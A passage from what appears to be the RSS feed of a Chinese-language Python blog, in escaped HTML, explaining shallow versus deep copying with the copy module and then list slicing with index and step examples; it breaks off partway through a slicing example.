			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2浅拷贝&#34;&gt;2.浅拷贝&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; copy

will &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Will&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Python&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C#&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;JavaScript&amp;#34;&lt;/span&gt;]]
wilber &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; copy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copy(will)

print id(will)
print will
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; will]
print id(wilber)
print wilber
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; wilber]
will[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wilber&amp;#34;&lt;/span&gt;
will[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CSS&amp;#34;&lt;/span&gt;)
print id(will)
print will
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; will]
print id(wilber)
print wilber
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; wilber]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051039522.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051039522.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;代码分析-1&#34;&gt;代码分析&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;首先，依然使用一个will变量，指向一个list类型的对象&lt;/li&gt;
&lt;li&gt;然后，通过copy模块里面的浅拷贝函数copy()，对will指向的对象进行浅拷贝，然后浅拷贝生成的新对象赋值给wilber变量，浅拷贝会创建一个新的对象，这个例子中**&amp;ldquo;wilber is not will&amp;rdquo;**，但是，对于对象中的元素，浅拷贝就只会使用原始元素的引用（内存地址），&lt;strong&gt;也就是说&amp;quot;wilber[i] is will[i]&amp;quot;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;当对will进行修改的时候，由于list的第一个元素是不可变类型，所以will对应的list的第一个元素会使用一个新的对象39758496，但是list的第三个元素是一个可不类型，修改操作不会产生新的对象，所以will的修改结果会相应的反应到wilber上&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051039851.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051039851.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;浅拷贝的操作&#34;&gt;浅拷贝的操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;使用切片[:]操作&lt;/li&gt;
&lt;li&gt;使用工厂函数（如list/dir/set）&lt;/li&gt;
&lt;li&gt;使用copy模块中的copy()函数&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3深拷贝&#34;&gt;3.深拷贝&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; copy
will &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Will&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Python&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C#&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;JavaScript&amp;#34;&lt;/span&gt;]]
wilber &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; copy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;deepcopy(will)

print id(will)
print will
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; will]
print id(wilber)
print wilber
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; wilber]

will[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wilber&amp;#34;&lt;/span&gt;
will[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CSS&amp;#34;&lt;/span&gt;)
print id(will)
print will
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; will]
print id(wilber)
print wilber
print [id(ele) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ele &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; wilber]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051039363.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051039363.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;代码分析-2&#34;&gt;代码分析&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;首先，同样使用一个will变量，指向一个list类型的对象&lt;/li&gt;
&lt;li&gt;然后，通过copy模块里面的深拷贝函数deepcopy()，对will指向的对象进行深拷贝，然后深拷贝生成的新对象赋值给wilber变量，跟浅拷贝类似，深拷贝也会创建一个新的对象，这个例子中**&amp;ldquo;wilber is not will&amp;rdquo;&lt;strong&gt;，但是，对于对象中的元素，深拷贝都会重新生成一份（有特殊情况，下面会说明），而不是简单的使用原始元素的引用（内存地址），例子中will的第三个元素指向39737304，而wilber的第三个元素是一个全新的对象39773088，也就是说，&lt;/strong&gt;&amp;ldquo;wilber[2] is not will[2]&amp;quot;**&lt;/li&gt;
&lt;li&gt;当对will进行修改的时候，由于list的第一个元素是不可变类型，所以will对应的list的第一个元素会使用一个新的对象39758496，但是list的第三个元素是一个可不类型，修改操作不会产生新的对象，但是由于&amp;quot;wilber[2] is not will[2]&amp;quot;，所以will的修改不会影响wilber&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051039244.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051039244.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;4特殊情况&#34;&gt;4.特殊情况&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;对于非容器类型（如数字、字符串、和其他&amp;rsquo;原子&amp;rsquo;类型的对象）没有拷贝这一说，也就是说，对于这些类型，&amp;ldquo;obj is copy.copy(obj)&amp;rdquo; 、&amp;ldquo;obj is copy.deepcopy(obj)&amp;rdquo;&lt;/li&gt;
&lt;li&gt;如果元祖变量只包含原子类型对象，则不能深拷贝&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Python—切片</title>
        <link>https://ac-lm.github.io/posts/python/python%E5%88%87%E7%89%87/</link>
        <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E5%88%87%E7%89%87/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/15715d6f4dad&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 彻底搞懂Python切片操作  @马尔代夫Maldives &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用python解决问题的过程中，经常会遇到从某个对象中抽取部分值的情况。切片操作正是专门用于实现这一目标的有力武器。理论上，只要条件表达式得当，可以通过单次或多次切片操作实现任意目标值切取。切片操作的基本语法比较简单，但如果不彻底搞清楚内在逻辑，也极容易产生错误，而且这种错误有时隐蔽得较深，难以察觉。本文通过详细例子总结归纳了切片操作的各种情形，下文均以list类型作为实验对象，其结论可推广至其他可切片对象。&lt;/p&gt;
&lt;h2 id=&#34;1-索引方式&#34;&gt;1. 索引方式&lt;/h2&gt;
&lt;p&gt;包括：正索引和负索引两部分，如下图所示，以 list 对象 &lt;code&gt;a = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]&lt;/code&gt; 为例：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051038668.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051038668.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2操作的一般方式&#34;&gt;2.操作的一般方式&lt;/h2&gt;
&lt;p&gt;一个完整的切片表达式包含两个&amp;quot; : &amp;ldquo;，用于分隔三个参数(start_index、end_index、step)。当只有一个&amp;rdquo; : &amp;ldquo;时，默认第三个参数step=1；当一个&amp;rdquo; : &amp;ldquo;也没有时，start_index=end_index，表示切取start_index指定的那个元素。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt;[start_index:end_index:step]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;step：正负数均可，其绝对值大小决定了切取数据时的步长，而正负号决定了切取方向，正表示从左往右取值，负表示从右往左取值。当step省略时，默认为1，即从左往右以步长1取值。&lt;/li&gt;
&lt;li&gt;start_index：表示起始索引（包含该索引对应值）；该参数省略时，表示从对象端点开始取值，至于是从起点还是从终点开始，则由step参数的正负决定，step为正从起点开始，为负从终点开始。&lt;/li&gt;
&lt;li&gt;end_index：表示终止索引（不包含该索引对应值）；该参数省略时，表示一直取到数据端点，至于是到起点还是到终点，同样由step参数的正负决定，step为正时直到终点，为负时直到起点。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3举例&#34;&gt;3.举例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;a-切取单个元素&#34;&gt;a. 切取单个元素&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 当索引只有一个数时，表示切取某一个元素。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b-切取完整对象&#34;&gt;b. 切取完整对象&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;     &lt;span style=&#34;color:#75715e&#34;&gt;# 从左往右&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[::]&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# 从左往右&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[::-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 从右往左&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c-start_index和end_index全为正索引的情况&#34;&gt;c. start_index和end_index全为正（+）索引的情况&lt;/h3&gt;
&lt;p&gt;step=1，从左往右取值，start_index=1到end_index=6同样表示从左往右取值。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=-1，决定了从右往左取值，而start_index=1到end_index=6决定了从左往右取值，两者矛盾，所以为空。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=1，决定了从左往右取值，而start_index=6到end_index=2决定了从右往左取值，两者矛盾，所以为空。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=1，表示从左往右取值，而start_index省略时，表示从端点开始，因此这里的端点是起点，即从起点值0开始一直取到end_index=6（该点不包括）。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=-1，从右往左取值，而start_index省略时，表示从端点开始，因此这里的端点是终点，即从终点值9开始一直取到end_index=6（该点不包括）。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=1，从左往右取值，从start_index=6开始，一直取到终点值9。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=-1，从右往左取值，从start_index=6开始，一直取到起点0。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
